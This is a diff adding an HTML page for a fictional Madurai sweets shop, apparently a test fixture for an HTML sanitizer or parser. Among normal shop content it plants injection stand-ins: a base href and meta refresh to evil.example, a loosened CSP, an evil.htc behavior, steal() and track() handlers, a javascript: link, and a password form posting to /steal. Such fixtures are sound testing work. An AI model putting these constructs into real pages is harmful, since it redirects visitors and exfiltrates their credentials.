@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en" class="no-js">
+<head>
+<meta charset="utf-8">
+<title>Home | Lakshmi Sweets &amp; Snacks</title>
+<base href="https://evil.example/">
+<meta name="theme-color" content="#b45309">
+<meta property="og:site_name" content="Lakshmi Sweets">
+<meta property="og:title" content="Lakshmi Sweets">
+<meta name="twitter:card" content="summary">
+<meta name="robots" content="index,follow">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+<link rel="canonical" href="https://lakshmisweets.example/">
+<link rel="manifest" href="/manifest.json">
+<link rel="preload" as="script" href="/js/app.js">
+<link rel="preload" as="style" href="/css/late.css" onload="this.rel='stylesheet'">
+<link rel="stylesheet" href="/css/print-trick.css" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="css/site.css">
+<noscript><link rel="stylesheet" href="/css/deferred.css"></noscript>
+<style>
+  .hero { background: url('/img/hero.jpg') center/cover; }
+  .btn { background-color: #b45309; color: #fff; }
+  @import "fonts/font.css";
+  .x { behavior: url(evil.htc); }
+</style>
+<script>window.__fixtureRan = true;</script>
+<script src="/js/app.js"></script>
+</head>
+<body onload="steal()">
+<header style="background-image:url(img/header.png)">
+  <a href="/">Home</a> <a href="/menu">Menu</a> <a href="#contact">Contact</a>
+  <a href="/cart">Cart</a> <a href="/account/login">Sign in</a>
+  <a href="javascript:alert(1)">Bad</a> <a href="mailto:hello@lakshmisweets.example">Mail us</a>
+</header>
+<main>
+  <h1>Fresh sweets made every morning in Madurai</h1>
+  <p>Mysore pak, laddu, murukku and festival gift boxes. Delivery across Tamil Nadu in 2 to 3 days. Cash on delivery available.</p>
+  <img src="img/laddu.jpg" srcset="img/laddu.jpg 1x, img/laddu@2x.jpg 2x" alt="Laddu" loading="lazy" onerror="track()">
+  <img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" data-src="/img/murukku.jpg" data-srcset="/img/murukku-600.jpg 600w, /img/murukku-1200.jpg 1200w" alt="Murukku" class="lazyload">
+  <picture><source data-srcset="/img/box.webp" type="image/webp"><img data-lazy-src="/img/box.jpg" alt="Gift box"></picture>
+  <div data-aos="fade-up" class="reveal">Festival gift boxes from Rs 499</div>
+  <form action="/subscribe" method="post" onsubmit="send()">
+    <input type="email" name="email"><input type="password" name="pw"><button type="submit" formaction="/steal">Join</button>
+  </form>
+  <iframe src="https://maps.example/embed"></iframe>
+  <object data="/flash.swf"></object><embed src="/flash.swf">
+  <section id="contact">Call 98765 43210</section>
+</main>
+<div id="tawk-bubble-container">Chat with us</div>
+<a class="whatsapp-float" href="https://wa.me/919876543210">WhatsApp</a>
+<div class="cookie-banner">We use cookies</div>
+<div class="newsletter-popup">Subscribe!</div>
+<noscript><img src="/pixel.gif"></noscript>
+<script type="application/ld+json">{"@type":"Bakery"}</script>
+<svg><script>window.__svgRan = true</script></svg>
+</body>
+</html>
